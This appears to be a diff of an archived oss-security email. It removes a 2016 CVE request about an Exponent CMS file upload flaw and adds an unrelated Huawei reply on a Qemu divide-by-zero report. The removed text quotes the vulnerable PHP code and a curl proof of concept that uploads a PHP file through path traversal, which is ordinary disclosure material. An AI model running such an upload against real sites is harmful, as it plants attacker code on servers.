@@ -1,83 +1,52 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/21/3
-Message-ID: <CAEiFw0UvtbGuJ-M_zR0M+BtrEMn_tg7J3KZs+huS25imOSTNkg@mail.gmail.com>
-Date: Wed, 21 Sep 2016 08:10:39 +0800
-From: Carl Peng <felixk3y@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE request：Exponent CMS 2.3.9 Arbitrary File Upload vulnerability in expFile.php
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/08/13
+Message-ID: <00fe01d25129$88fc70c0$9af55240$@com>
+Date: Thu, 8 Dec 2016 16:03:16 +0800
+From: Huawei PSIRT <psirt@...wei.com>
+To: <ppandit@...hat.com>, <oss-security@...ts.openwall.com>
+CC: <liq3ea@...il.com>, <jiangxin1@...wei.com>, Huawei PSIRT <PSIRT@...wei.com>, "Wanglijun (PSIRT)" <wanglijun.wanglijun@...wei.com>
+Subject: Re: CVE request Qemu: display: cirrus_vga: a divide by zero in cirrus_do_copy
 Content-Type: text/plain; charset=utf-8
 
-Hi, I reported the following Arbitrary File Upload vulnerability to the
-ExponentCMS team on Sep 13, 2016:
-vulnerability:
-https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/controllers/fileController.php#L570-L592
-```
-if (!empty($this->params['folder']) || (defined('QUICK_UPLOAD_FOLDER') &&
-QUICK_UPLOAD_FOLDER != '' && QUICK_UPLOAD_FOLDER != 0)) {
-            // prevent attempt to place file somewhere other than /files
-folder
-            if (!empty($this->params['folder']) &&
-strpos($this->params['folder'], '..') !== false) {
-                $ar = new expAjaxReply(300, gt("File was not uploaded!"));
-                $ar->send();
-            }
-            if (SITE_FILE_MANAGER == 'picker') {
-                $quikFolder = !empty($this->params['folder']) ?
-$this->params['folder'] :QUICK_UPLOAD_FOLDER;
-                $destDir = null;
-            } elseif (SITE_FILE_MANAGER == 'elfinder') {
-                $quikFolder = null;
-                $destDir = UPLOAD_DIRECTORY_RELATIVE .
-(!empty($this->params['folder']) ? $this->params['folder']
-:QUICK_UPLOAD_FOLDER) . '/';
-                // create folder if non-existant
-                expFile::makeDirectory($destDir);
-            }
-        } else {
-            $quikFolder = null;
-            $destDir = null;
-        }
-        //extensive suitability check before doing anything with the file...
-        if (isset($_SERVER['HTTP_X_FILE_NAME'])) {  //HTML5 XHR upload
-            $file =
-expFile::fileXHRUpload($_SERVER['HTTP_X_FILE_NAME'],false,false,null,$destDir,intval(QUICK_UPLOAD_WIDTH));
- //here File Upload vulnerability
-            $file->poster = $user->id;
-```
-the "folder"  and "$_SERVER['HTTP_X_FILE_NAME']", the two parameters may be
-submitted by the user
+Dear,
 
-expFile::fileXHRUpload():
-https://github.com/exponentcms/exponent-cms/blob/master/framework/modules/file/models/expFile.php#L526
-```
-$_destFile = ($_destFile == null) ? self::fixName($fileName) : $_destFile;
-//"fileName" parameter may be submitted by the user
-//...
-$maxwidth = intval($_max_width);
-if (!empty($maxwidth)) {
-..///
-} else {
-    file_put_contents($_destFullPath, file_get_contents('php://input',
-'r')); // line 572
-}
+Could you please change the reporter information from PSIRTeam of Huawei Inc
+to Jiangxin <jiangxin1@...wei.com> of Huawei Inc. Thank you.
 
-Proof of concept:
-curl -H "X-File-Name: e.php" -d
-"controller=file&action=quickUpload&code=<?php
-phpinfo();?>&folder=../install" http://www.exponentcms.org/index.php
+Best regards,
+Huawei PSIRT
 
-http://www.exponentcms.org/install/e.php
+-----邮件原件-----
+发件人: P J P [mailto:ppandit@...hat.com] 
+发送时间: 2016年12月8日 15:32
+收件人: oss security list
+抄送: liq3ea@...il.com; psirt@...wei.com
+主题: CVE request Qemu: display: cirrus_vga: a divide by zero in
+cirrus_do_copy
 
+   Hello,
 
-And Now, This  vulnerability have been fixed.
-https://exponentcms.lighthouseapp.com/projects/61783/changesets/355702a9835cf527796c9d469a82258b7639148a
-https://github.com/exponentcms/exponent-cms/commit/355702a9835cf527796c9d469a82258b7639148a
+Quick emulator(Qemu) built with the Cirrus CLGD 54xx VGA Emulator support is
+vulnerable to a divide by zero issue. It could occur while copying VGA data
+when cirrus graphics mode was set to be VGA.
 
-This issue was reported by Peng Hua of silence.com.cn Inc. and I would like
-to request a CVE for this issue (if not done so).
+A privileged user inside guest could use this flaw to crash the Qemu process
+instance on the host, resulting in DoS.
+
+Upstream patch
+--------------
+   -> https://lists.gnu.org/archive/html/qemu-devel/2016-12/msg00442.html
+
+Reference:
+----------
+   -> https://bugzilla.redhat.com/show_bug.cgi?id=1334398
+
+This issue was independently reported by Qinghao Tang, Li Qiang of Qihoo
+360.cn Inc. and PSIRTeam of Huawei Inc.
+
 
 Thank you.
----------------------------------http://www.silence.com.cn
-penghua#silence.com.cn
-PKAV Team
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
 
